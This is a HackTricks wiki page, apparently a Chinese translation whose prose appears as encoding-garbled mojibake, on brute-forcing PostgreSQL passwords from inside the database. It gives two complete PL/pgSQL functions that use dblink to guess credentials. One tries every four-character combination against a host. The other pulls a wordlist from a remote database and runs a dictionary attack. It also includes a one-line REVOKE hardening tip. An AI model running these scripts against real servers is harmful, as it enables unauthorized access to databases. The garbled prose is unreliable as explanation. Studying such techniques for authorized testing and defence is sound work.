# PL/pgSQL å¯†ç æš´åŠ›ç ´è§£

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

**åœ¨åŸå§‹æ–‡æ¡£ä¸­æ‰¾åˆ°[æ›´å¤šå…³äºè¿™äº›æ”»å‡»çš„ä¿¡æ¯](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**ã€‚

PL/pgSQL æ˜¯ä¸€ç§ **åŠŸèƒ½é½å…¨çš„ç¼–ç¨‹è¯­è¨€**ï¼Œé€šè¿‡æä¾› **å¢å¼ºçš„è¿‡ç¨‹æ§åˆ¶** è¶…è¶Šäº† SQL çš„èƒ½åŠ›ã€‚è¿™åŒ…æ‹¬ä½¿ç”¨å¾ªç¯å’Œå„ç§æ§åˆ¶ç»“æ„ã€‚ç”¨ PL/pgSQL è¯­è¨€ç¼–å†™çš„å‡½æ•°å¯ä»¥é€šè¿‡ SQL è¯­å¥å’Œè§¦å‘å™¨è°ƒç”¨ï¼Œä»è€Œæ‰©å±•æ•°æ®åº“ç¯å¢ƒä¸­çš„æ“ä½œèŒƒå›´ã€‚

æ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¯­è¨€è¦æ±‚ PostgreSQL æš´åŠ›ç ´è§£ç”¨æˆ·å‡­æ®ï¼Œä½†å®ƒå¿…é¡»å­˜åœ¨äºæ•°æ®åº“ä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•éªŒè¯å®ƒçš„å­˜åœ¨ï¼š
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+---------
plpgsql |
```
é»˜è®¤æƒ…å†µä¸‹ï¼Œ**åˆ›å»ºå‡½æ•°æ˜¯æˆäºˆPUBLICçš„ç‰¹æƒ**ï¼Œå…¶ä¸­PUBLICæŒ‡çš„æ˜¯è¯¥æ•°æ®åº“ç³»ç»Ÿä¸Šçš„æ¯ä¸ªç”¨æˆ·ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œç®¡ç†å‘˜å¯èƒ½éœ€è¦ä»PUBLICåŸŸæ’¤é”€USAGEç‰¹æƒï¼š
```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹‹å‰çš„æŸ¥è¯¢å°†è¾“å‡ºä¸åŒçš„ç»“æœï¼š
```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
lanname | lanacl
---------+-----------------
plpgsql | {admin=U/admin}
```
æ³¨æ„ï¼Œä»¥ä¸‹è„šæœ¬è¦æ­£å¸¸å·¥ä½œ**éœ€è¦å­˜åœ¨å‡½æ•° `dblink`**ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡
```sql
CREATE EXTENSION dblink;
```
## å¯†ç æš´åŠ›ç ´è§£

è¿™é‡Œæ˜¯å¦‚ä½•æ‰§è¡Œä¸€ä¸ª4ä¸ªå­—ç¬¦çš„å¯†ç æš´åŠ›ç ´è§£ï¼š
```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
word TEXT;
BEGIN
FOR a IN 65..122 LOOP
FOR b IN 65..122 LOOP
FOR c IN 65..122 LOOP
FOR d IN 65..122 LOOP
BEGIN
word := chr(a) || chr(b) || chr(c) || chr(d);
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;
EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection
THEN
-- do nothing
END;
END LOOP;
END LOOP;
END LOOP;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
_è¯·æ³¨æ„ï¼Œå³ä½¿æ˜¯æš´åŠ›ç ´è§£4ä¸ªå­—ç¬¦ä¹Ÿå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿã€‚_

æ‚¨è¿˜å¯ä»¥**ä¸‹è½½ä¸€ä¸ªå­—å…¸**å¹¶ä»…å°è¯•é‚£äº›å¯†ç ï¼ˆå­—å…¸æ”»å‡»ï¼‰ï¼š
```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
FOR word IN (SELECT word FROM dblink('host=1.2.3.4
user=name
password=qwerty
dbname=wordlists',
'SELECT word FROM wordlist')
RETURNS (word TEXT)) LOOP
BEGIN
PERFORM(SELECT * FROM dblink(' host=' || host ||
' port=' || port ||
' dbname=' || dbname ||
' user=' || username ||
' password=' || word,
'SELECT 1')
RETURNS (i INT));
RETURN word;

EXCEPTION
WHEN sqlclient_unable_to_establish_sqlconnection THEN
-- do nothing
END;
END LOOP;
RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

-- Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
